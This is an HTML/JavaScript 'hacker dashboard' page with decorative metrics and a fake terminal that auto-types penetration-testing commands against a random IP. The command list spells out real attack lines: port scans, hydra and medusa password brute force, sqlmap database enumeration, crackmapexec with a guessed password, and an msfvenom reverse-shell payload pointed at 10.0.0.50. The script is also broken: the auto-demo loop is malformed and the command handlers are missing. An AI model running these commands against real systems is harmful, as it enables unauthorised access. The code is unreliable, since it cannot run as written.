<!DOCTYPE html>
<html lang="en" class="dark">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>OVERWATCH - Session Console</title>

    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            darkMode: 'class',
            theme: {
                extend: {
                    fontFamily: {
                        sans: ['Inter', 'system-ui', 'sans-serif'],
                        mono: ['"JetBrains Mono"', '"Fira Code"', 'ui-monospace', 'monospace'],
                    },
                    colors: {
                        surface: {
                            base: '#09090b',
                            panel: '#18181b',
                            hover: '#27272a',
                            border: '#3f3f46',
                        },
                        brand: {
                            cyan: '#06b6d4',
                            cyan_glow: 'rgba(6, 182, 212, 0.15)',
                            blue: '#3b82f6',
                            purple: '#8b5cf6',
                            red: '#ef4444',
                            amber: '#f59e0b',
                            green: '#22c55e'
                        }
                    }
                }
            }
        }
    </script>

    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">

    <style>
        body { font-family: 'Inter', sans-serif; }
        .font-mono { font-family: 'JetBrains Mono', monospace; }

        ::-webkit-scrollbar { width: 4px; height: 4px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: #3f3f46; border-radius: 2px; }

        .glass-panel {
            background: rgba(24, 24, 27, 0.72);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1px solid rgba(63, 63, 70, 0.5);
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
        }

        .data-value-glow { text-shadow: 0 0 10px rgba(6, 182, 212, 0.3); }

        @keyframes blink {
            0%, 49% { opacity: 1; }
            50%, 100% { opacity: 0; }
        }
        .cursor-blink {
            display: inline-block;
            width: 0.55em;
            height: 1.05em;
            background: #a1a1aa;
            vertical-align: text-bottom;
            margin-left: 1px;
            animation: blink 1s step-end infinite;
        }
        
        .scanline-bg {
            background-image: radial-gradient(rgba(63, 63, 70, 0.15) 1px, transparent 1px);
            background-size: 24px 24px;
        }

        #terminal-output {
            overflow-y: auto;
            overflow-x: hidden;
            scrollbar-width: thin;
            scrollbar-color: #3f3f46 transparent;
        }

        #terminal-typed {
            overflow-wrap: anywhere;
            word-break: break-word;
        }

        .term-line {
            white-space: pre-wrap;
            word-break: break-word;
            overflow-wrap: anywhere;
            margin-bottom: 2px;
            line-height: 1.45;
            max-width: 100%;
        }
        .term-cmd { color: #e4e4e7; }
        .term-prompt { color: #06b6d4; }
        .term-output { color: #a1a1aa; }
        .term-success { color: #22c55e; }
        .term-error { color: #ef4444; }
        .term-warn { color: #f59e0b; }
        .term-info { color: #3b82f6; }
        .term-purple { color: #8b5cf6; }
        .term-cyan { color: #06b6d4; }
    </style>
</head>

<body class="bg-surface-base text-zinc-400 h-screen overflow-hidden selection:bg-brand-cyan selection:text-white flex flex-col relative">
    
    <div class="absolute inset-0 z-0 pointer-events-none scanline-bg"></div>

    <div class="relative z-10 flex h-full flex-col w-full">
        <!-- Header -->
        <header class="h-16 shrink-0 border-b border-surface-border bg-surface-base/85 backdrop-blur-sm px-6 lg:px-8 flex items-center justify-between">
            <div class="flex items-center gap-6 min-w-0">
                <div class="flex items-center gap-3 shrink-0">
                    <div class="w-2 h-2 bg-brand-cyan rounded-full animate-pulse shadow-[0_0_8px_#06b6d4]"></div>
                    <h1 class="text-zinc-100 font-semibold tracking-wide text-sm m-0">
                        OVERWATCH
                    </h1>
                </div>

                <div class="hidden md:flex items-center gap-5 text-xs font-mono min-w-0">
                    <div class="flex items-center text-zinc-300">
                        <span class="text-zinc-500 mr-2">Target Node:</span>
                        <span id="target-ip" class="text-zinc-100 font-medium tracking-wider"></span>
                    </div>
                </div>
            </div>

            <div class="flex items-center gap-3 lg:gap-4 text-xs shrink-0">
                <div class="font-mono text-zinc-400 hidden sm:flex items-center gap-1" id="system-clock">
                    <span id="system-clock-time">00:00:00</span>
                    <span class="text-zinc-600">UTC</span>
                </div>
                <div class="h-4 w-px bg-surface-border hidden sm:block"></div>
                
            </div>
        </header>

        <!-- Main Content: top dashboards / bottom full-width shell -->
        <main class="flex-1 min-h-0 overflow-hidden p-4 lg:p-5 flex flex-col gap-4">

            <!-- TOP: Metrics + Chart -->
            <div class="shrink-0 flex flex-col gap-4" style="height: min(38vh, 320px);">
                <!-- Metrics -->
                <section class="grid grid-cols-3 gap-3 shrink-0">
                    <div class="glass-panel p-3 lg:p-4 rounded-2xl flex flex-col justify-between min-h-[88px]">
                        <div class="flex justify-between items-start mb-1">
                            <h2 class="text-[11px] font-medium text-zinc-500 uppercase tracking-wider m-0">Relay Throughput</h2>
                            <i data-lucide="arrow-down-right" class="w-4 h-4 text-brand-cyan"></i>
                        </div>
                        <div class="flex items-end gap-2">
                            <span class="text-2xl lg:text-3xl font-light text-zinc-100 font-mono data-value-glow" id="inbound-metric">0.0</span>
                            <span class="text-sm text-zinc-500 mb-0.5">Gbps</span>
                        </div>
                    </div>

                    <div class="glass-panel p-3 lg:p-4 rounded-2xl flex flex-col justify-between min-h-[88px]">
                        <div class="flex justify-between items-start mb-1">
                            <h2 class="text-[11px] font-medium text-zinc-500 uppercase tracking-wider m-0">Active Nodes</h2>
                            <i data-lucide="crosshair" class="w-4 h-4 text-brand-red"></i>
                        </div>
                        <div class="flex items-end gap-2">
                            <span class="text-2xl lg:text-3xl font-light text-zinc-100 font-mono" id="hosts-metric">1,842</span>
                        </div>
                    </div>

                    <div class="glass-panel p-3 lg:p-4 rounded-2xl flex flex-col justify-between min-h-[88px]">
                        <div class="flex justify-between items-start mb-1">
                            <h2 class="text-[11px] font-medium text-zinc-500 uppercase tracking-wider m-0">Outbound Packets</h2>
                            <i data-lucide="database-zap" class="w-4 h-4 text-brand-purple"></i>
                        </div>
                        <div class="flex items-end gap-2">
                            <span class="text-2xl lg:text-3xl font-light text-zinc-100 font-mono" id="exfil-metric">847</span>
                            <span class="text-sm text-zinc-500 mb-0.5">GB</span>
                        </div>
                    </div>
                </section>

                <!-- Chart -->
                <div class="glass-panel rounded-2xl p-4 flex flex-col flex-1 min-h-0 overflow-hidden">
                    <div class="flex justify-between items-center mb-2 shrink-0">
                        <h2 class="text-sm font-medium text-zinc-300 m-0">Packet Trace</h2>
                        <div class="flex gap-4">
                            <span class="flex items-center text-xs text-zinc-500"><div class="w-2 h-2 rounded-full bg-brand-cyan mr-2"></div>AUX</span>
                            <span class="flex items-center text-xs text-zinc-500"><div class="w-2 h-2 rounded-full bg-brand-purple mr-2"></div>RAW</span>
                        </div>
                    </div>
                    <div class="relative flex-1 min-h-0 w-full">
                        <canvas id="telemetryChart"></canvas>
                    </div>
                </div>
            </div>

            <!-- BOTTOM: Full-width Shell Console -->
            <div class="glass-panel rounded-2xl p-4 flex flex-col flex-1 min-h-0 overflow-hidden">
                <div class="flex justify-between items-center mb-3 shrink-0">
                    <div class="flex items-center gap-2.5">
                        <i data-lucide="terminal" class="w-4 h-4 text-zinc-400"></i>
                        <h2 class="text-sm font-medium text-zinc-300 m-0">Shell Console</h2>
                    </div>
                    <span class="flex items-center gap-1.5 text-[10px] font-mono text-brand-green bg-brand-green/10 px-2 py-1 rounded border border-brand-green/20">
                        <div class="w-1.5 h-1.5 rounded-full bg-brand-green animate-pulse"></div>
                        CONNECTED
                    </span>
                </div>

                <div class="flex-1 min-h-0 bg-black/40 rounded-xl border border-white/5 p-3 font-mono text-[12px] leading-relaxed flex flex-col relative shadow-inner overflow-hidden" id="terminal-wrapper">
                    <div id="terminal-output" class="flex-1 min-h-0 overflow-y-auto overflow-x-hidden pb-2"></div>
                    <div class="flex items-baseline gap-1.5 text-zinc-400 shrink-0 border-t border-white/5 pt-2 mt-1 min-w-0 font-mono text-[12px] leading-[1.45]">
                        <span class="text-brand-cyan font-medium shrink-0 whitespace-nowrap" id="prompt-user">root@overwatch</span>
                        <span class="text-zinc-600 shrink-0 whitespace-nowrap" id="prompt-path">~ $</span>
                        <span class="min-w-0 flex-1 text-zinc-100" style="overflow-wrap:anywhere;word-break:break-word;">
                            <span id="terminal-typed"></span><span class="cursor-blink" id="terminal-caret"></span>
                        </span>
                    </div>
                </div>
            </div>

        </main>
    </div>

    <script>
        class Utils {
            static targetIP = '';

            static generateRandomIP() {
                const first = Math.floor(Math.random() * 223) + 1;
                const rest = Array.from({ length: 3 }, () => Math.floor(Math.random() * 256));
                return [first, ...rest].join('.');
            }

            static randomInRange(min, max) {
                return Math.random() * (max - min) + min;
            }

            static clamp(value, min, max) {
                return Math.min(max, Math.max(min, value));
            }

            static getUTCTimeString() {
                return new Date().toISOString().substring(11, 19);
            }

            static getLocalTimeString() {
                const d = new Date();
                return d.toTimeString().substring(0, 8);
            }

            static generateHex(length) {
                let result = '';
                const chars = '0123456789abcdef';
                for (let i = 0; i < length; i++) {
                    result += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                return result;
            }

            static delay(ms) {
                return new Promise(r => setTimeout(r, ms));
            }
        }

        class SystemHeader {
            constructor() {
                this.ipElement = document.getElementById('target-ip');
                this.clockElement = document.getElementById('system-clock-time');
                this.init();
            }

            init() {
                Utils.targetIP = Utils.generateRandomIP();
                this.ipElement.textContent = Utils.targetIP;
                
                this.updateClock();
                setInterval(() => this.updateClock(), 1000);
            }

            updateClock() {
                this.clockElement.textContent = Utils.getUTCTimeString();
            }
        }

        class SystemMetrics {
            constructor() {
                this.elements = {
                    inbound: document.getElementById('inbound-metric'),
                    hosts: document.getElementById('hosts-metric'),
                    exfil: document.getElementById('exfil-metric')
                };
                
                this.elements.inbound.textContent = '42.8';
                this.startSimulation();
            }

            startSimulation() {
                setInterval(() => this.updateMetrics(), 1000);
            }

            updateMetrics() {
                if (Math.random() > 0.45) {
                    const newValue = Utils.randomInRange(38, 48);
                    this.elements.inbound.textContent = newValue.toFixed(1);
                }

                if (Math.random() > 0.7) {
                    const current = parseInt(this.elements.hosts.textContent.replace(/,/g, ''), 10);
                    const increment = Math.floor(Math.random() * 4);
                    this.elements.hosts.textContent = (current + increment).toLocaleString();
                }

                if (Math.random() > 0.8) {
                    const current = parseInt(this.elements.exfil.textContent, 10);
                    this.elements.exfil.textContent = (current + 1).toString();
                }
            }
        }

        class TelemetryChart {
            constructor(canvasId) {
                this.ctx = document.getElementById(canvasId).getContext('2d');
                this.dataPoints = 30;
                this.tcpData = Array.from({ length: this.dataPoints }, () => Utils.randomInRange(20, 75));
                this.udpData = Array.from({ length: this.dataPoints }, () => Utils.randomInRange(10, 45));
                
                this.setupChartDefaults();
                this.initChart();
                this.startSimulation();
            }

            setupChartDefaults() {
                Chart.defaults.color = '#71717a';
                Chart.defaults.font.family = "'Inter', sans-serif";
                Chart.defaults.plugins.tooltip.backgroundColor = 'rgba(24, 24, 27, 0.94)';
                Chart.defaults.plugins.tooltip.titleColor = '#f4f4f5';
                Chart.defaults.plugins.tooltip.bodyColor = '#a1a1aa';
                Chart.defaults.plugins.tooltip.borderColor = '#3f3f46';
                Chart.defaults.plugins.tooltip.borderWidth = 1;
            }

            createGradient(colorStart, colorEnd) {
                const gradient = this.ctx.createLinearGradient(0, 0, 0, 360);
                gradient.addColorStop(0, colorStart);
                gradient.addColorStop(1, colorEnd);
                return gradient;
            }

            initChart() {
                const labels = Array.from({ length: this.dataPoints }, (_, i) => i);
                const gradientAUX = this.createGradient('rgba(6, 182, 212, 0.18)', 'rgba(6, 182, 212, 0)');
                const gradientRAW = this.createGradient('rgba(139, 92, 246, 0.18)', 'rgba(139, 92, 246, 0)');

                this.chart = new Chart(this.ctx, {
                    type: 'line',
                    data: {
                        labels,
                        datasets: [
                            {
                                label: 'Relay A (AUX)',
                                data: this.tcpData,
                                borderColor: '#06b6d4',
                                backgroundColor: gradientAUX,
                                borderWidth: 1.25,
                                fill: true,
                                tension: 0.2,
                                pointRadius: 0,
                                pointHitRadius: 10,
                            },
                            {
                                label: 'Relay B (RAW)',
                                data: this.udpData,
                                borderColor: '#8b5cf6',
                                backgroundColor: gradientRAW,
                                borderWidth: 1.25,
                                fill: true,
                                tension: 0.2,
                                pointRadius: 0,
                                pointHitRadius: 10,
                            }
                        ]
                    },
                    options: {
                        responsive: true,
                        maintainAspectRatio: false,
                        animation: { duration: 0 },
                        interaction: { mode: 'index', intersect: false },
                        scales: {
                            x: { display: false },
                            y: {
                                display: true,
                                position: 'right',
                                grid: { color: 'rgba(63, 63, 70, 0.25)', drawBorder: false },
                                border: { display: false },
                                ticks: { font: { family: "'JetBrains Mono', monospace", size: 10 }, stepSize: 20 }
                            }
                        },
                        plugins: { legend: { display: false } }
                    }
                });
            }

            startSimulation() {
                setInterval(() => {
                    const tcpSpike = Math.random() > 0.92 ? 22 : 0;
                    const nextTcp = Utils.clamp(this.tcpData[this.tcpData.length - 1] + Utils.randomInRange(-9, 9) + tcpSpike, 8, 95);
                    const nextUdp = Utils.clamp(this.udpData[this.udpData.length - 1] + Utils.randomInRange(-6, 6), 5, 60);

                    this.tcpData.shift(); this.tcpData.push(nextTcp);
                    this.udpData.shift(); this.udpData.push(nextUdp);
                    this.chart.update('none');
                }, 1000);
            }
        }

        // ========== Shell Console ==========
        class TerminalConsole {
            constructor() {
                this.output = document.getElementById('terminal-output');
                this.typedEl = document.getElementById('terminal-typed');
                this.promptUser = document.getElementById('prompt-user');
                this.promptPath = document.getElementById('prompt-path');
                this.msfMode = false;
                this.msfModule = null;
                this.running = true;
                this.recentHistory = []; // last up to 5 handlers / sequences
                this.maxOutputLines = 250;
                this.handlers = this.buildHandlers();

                this.printWelcome();
                setTimeout(() => this.runAutoDemo(), 1200);
            }

            get target() {
                return Utils.targetIP || '192.168.1.100';
            }

            // ----- DOM helpers -----
            appendLine(html, cls = 'term-output') {
                const div = document.createElement('div');
                div.className = `term-line ${cls}`;
                div.innerHTML = html;
                this.output.appendChild(div);
                while (this.output.childElementCount > this.maxOutputLines) {
                    this.output.removeChild(this.output.firstElementChild);
                }
                this.output.scrollTop = this.output.scrollHeight;
            }

            appendLines(lines, cls = 'term-output') {
                for (const line of lines) this.appendLine(line, cls);
            }

            escapeHtml(str) {
                return String(str)
                    .replace(/&/g, '&amp;')
                    .replace(/</g, '&lt;')
                    .replace(/>/g, '&gt;');
            }

            setPrompt(msf = false, module = null) {
                if (msf) {
                    this.promptUser.textContent = 'msf';
                    this.promptPath.innerHTML = module
                        ? ` <span class="text-brand-purple">auxiliary(${module})</span> >`
                        : ' >';
                } else {
                    this.promptUser.textContent = 'root@overwatch';
                    this.promptPath.textContent = '~ $';
                }
            }

            printWelcome() {
                this.appendLines([
                    'Linux overwatch 6.8.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.8.11-1kali1 (2026-05-12) x86_64',
                    '',
                    'The programs included with the Kali GNU/Linux system are free software;',
                    'the exact distribution terms for each program are described in the',
                    'individual files in /usr/share/doc/*/copyright.',
                    '',
                    'Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent',
                    'permitted by applicable law.',
                    ''
                ]);
            }

            // ----- Typing -----
            async typeCommand(cmd, speed = 28) {
                this.typedEl.textContent = '';
                for (let i = 0; i < cmd.length; i++) {
                    this.typedEl.textContent += cmd[i];
                    await Utils.delay(speed + Math.random() * 18);
                }
                await Utils.delay(280);
            }

            async commitCommand(cmd) {
                let promptHtml;
                if (this.msfMode) {
                    promptHtml = this.msfModule
                        ? `<span class="term-prompt">msf</span> <span class="term-purple">auxiliary(${this.msfModule})</span> &gt; `
                        : `<span class="term-prompt">msf</span> &gt; `;
                } else {
                    promptHtml = `<span class="term-prompt">root@overwatch</span> <span class="text-zinc-600">~ $</span> `;
                }
                this.appendLine(promptHtml + `<span class="term-cmd">${this.escapeHtml(cmd)}</span>`);
                this.typedEl.textContent = '';
            }

            // ----- Command pool -----
            getCommandPool() {
                const t = this.target;
                return [
                    // recon
                    { cmd: `nmap -sV -p- ${t}`, handler: 'nmap', weight: 3 },
                    { cmd: `nmap -sS -T4 -Pn ${t}`, handler: 'nmap', weight: 2 },
                    { cmd: `nmap -sC -sV -oA scan_${t.replace(/\./g, '_')} ${t}`, handler: 'nmap', weight: 2 },
                    { cmd: `nmap -p 21,22,23,25,53,80,110,139,443,445,3306,3389,8080,8443 ${t}`, handler: 'nmap', weight: 2 },
                    { cmd: `nmap -sU -sV --top-ports 20 ${t}`, handler: 'nmap_udp', weight: 1 },
                    { cmd: `masscan ${t}/24 -p1-65535 --rate=1000`, handler: 'masscan', weight: 2 },

                    // web
                    { cmd: `curl -I -v http://${t}`, handler: 'curl', weight: 2 },
                    { cmd: `curl -s -X POST http://${t}/login -d 'user=admin&pass=admin'`, handler: 'curl_post', weight: 2 },
                    { cmd: `curl -s http://${t}/api/v1/users -H 'Authorization: Bearer eyJhbGciOi...'`, handler: 'curl_api', weight: 2 },
                    { cmd: `wget -q -O - http://${t}/robots.txt`, handler: 'wget', weight: 1 },
                    { cmd: `gobuster dir -u http://${t} -w /usr/share/wordlists/dirb/common.txt -t 50`, handler: 'gobuster', weight: 3 },
                    { cmd: `ffuf -u http://${t}/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,403`, handler: 'ffuf', weight: 2 },
                    { cmd: `nikto -h http://${t}`, handler: 'nikto', weight: 2 },
                    { cmd: `whatweb http://${t}`, handler: 'whatweb', weight: 1 },
                    { cmd: `wafw00f http://${t}`, handler: 'wafw00f', weight: 1 },

                    // injection / auth
                    { cmd: `sqlmap -u "http://${t}/search.php?q=test" --batch --dbs`, handler: 'sqlmap', weight: 2 },
                    { cmd: `hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://${t}`, handler: 'hydra_ssh', weight: 2 },
                    { cmd: `hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form://${t}/login.php:username=^USER^&password=^PASS^:Invalid`, handler: 'hydra', weight: 2 },
                    { cmd: `medusa -h ${t} -u admin -P /usr/share/wordlists/rockyou.txt -M ssh`, handler: 'medusa', weight: 1 },
                    { cmd: `john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`, handler: 'john', weight: 1 },
                    { cmd: `hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt`, handler: 'hashcat', weight: 1 },

                    // network / capture
                    { cmd: `nc -zv -w 2 ${t} 22 80 443 3306 8080 9000`, handler: 'nc', weight: 2 },
                    { cmd: `tcpdump -i eth0 -n -c 10 'port 80 or port 443'`, handler: 'tcpdump', weight: 2 },
                    { cmd: `tshark -i eth0 -c 5 -f 'tcp port 80'`, handler: 'tshark', weight: 1 },
                    { cmd: `openssl s_client -connect ${t}:443 -servername ${t} </dev/null 2>/dev/null | openssl x509 -noout -subject -issuer -dates`, handler: 'openssl', weight: 2 },
                    { cmd: `ping -c 4 ${t}`, handler: 'ping', weight: 1 },
                    { cmd: `traceroute -n ${t}`, handler: 'traceroute', weight: 1 },

                    // smb / windows
                    { cmd: `enum4linux -a ${t}`, handler: 'enum4linux', weight: 2 },
                    { cmd: `smbclient -L //${t} -N`, handler: 'smbclient', weight: 2 },
                    { cmd: `rpcclient -U '' -N ${t}`, handler: 'rpcclient', weight: 1 },
                    { cmd: `crackmapexec smb ${t} -u admin -p 'Password123!'`, handler: 'cme', weight: 2 },

                    // exploit
                    { cmd: 'msfconsole', handler: 'msfstart', weight: 2 },
                    { cmd: `searchsploit apache 2.4`, handler: 'searchsploit', weight: 1 },
                    { cmd: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.50 LPORT=4444 -f elf -o /tmp/shell.elf`, handler: 'msfvenom', weight: 1 },
                ];
            }

            remember(key) {
                this.recentHistory.push(key);
                if (this.recentHistory.length > 5) this.recentHistory.shift();
            }

            isRecent(key) {
                return this.recentHistory.includes(key);
            }

            /**
             * Weighted random pick among commands whose handler is not in the
             * last 5 history entries. msfconsole is gated by 'msf_session'.
             */
            pickRandomCommand() {
                const pool = this.getCommandPool();
                let eligible = pool.filter((item) => {
                    if (this.isRecent(item.handler)) return false;
                    if (item.handler === 'msfstart' && this.isRecent('msf_session')) return false;
                    return true;
                });

                // If exhausted, drop oldest history entries until something qualifies
                if (eligible.length === 0) {
                    while (this.recentHistory.length && eligible.length === 0) {
                        this.recentHistory.shift();
                        eligible = pool.filter((item) => {
                            if (this.isRecent(item.handler)) return false;
                            if (item.handler === 'msfstart' && this.isRecent('msf_session')) return false;
                            return true;
                        });
                    }
                }

                if (eligible.length === 0) eligible = pool.slice();

                const totalWeight = eligible.reduce((sum, item) => sum + (item.weight || 1), 0);
                let r = Math.random() * totalWeight;
                for (const item of eligible) {
                    r -= (item.weight || 1);
                    if (r <= 0) return item;
                }
                return eligible[eligible.length - 1];
            }

            async runAutoDemo() {

                    const step = this.pickRandomCommand();
                    if (step.handler === 'msfstart') {

                            continue;
                        }
                        await this.runMsfSession();
                        this.remember('msf_session');
                        await Utils.delay(Utils.randomInRange(1000, 2000));

                    await this.typeCommand(step.cmd, 20 + Math.random() * 22);
                    await this.commitCommand(step.cmd);
                    await this.dispatch(step.handler);
                    this.remember(step.handler);
                    await Utils.delay(Utils.randomInRange(800, 2400));

            async runMsfSession() {
                const t = this.target;
                const steps = [
                    { cmd: 'msfconsole', handler: 'msfstart' },
                    { cmd: 'search smb_version', handler: 'msfsearch' },
                    { cmd: 'use auxiliary/scanner/smb/smb_version', handler: 'msfuse' },
                    { cmd: `set RHOSTS ${t}`, handler: 'msfset' },
                    { cmd: 'run', handler: 'msfrun' },
                    { cmd: 'exit', handler: 'msfexit' },
                ];
                for (const step of steps) {
                    if (!this.running) break;
                    await this.typeCommand(step.cmd, 22 + Math.random() * 18);
                    await this.commitCommand(step.cmd);
                    await this.dispatch(step.handler);
                    await Utils.delay(Utils.randomInRange(450, 1200));
                }
            }

            // ----- Dispatch -----
            async dispatch(handler) {
                const t = this.target;
                const fn = this.handlers[handler];
                if (typeof fn === 'function') {
                    await fn.call(this, t);
                } else {
                    this.appendLine(`${handler}: command not found`);
                }
            }

            async simMsfvenom(t) {
                this.appendLines([
                    '[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload',
                    '[-] No arch selected, selecting arch: x64 from the payload',
                    'No encoder specified, outputting raw payload',
                    'Payload size: 130 bytes',
                    'Final size of elf file: 250 bytes',
                    'Saved as: /tmp/shell.elf'
                ]);
            }
        }

        class DashboardApp {
            static bootstrap() {
                lucide.createIcons();
                new SystemHeader();
                new SystemMetrics();
                setTimeout(() => {
                    new TelemetryChart('telemetryChart');
                }, 0);
                new TerminalConsole();
            }
        }

        document.addEventListener('DOMContentLoaded', DashboardApp.bootstrap);
    </script>
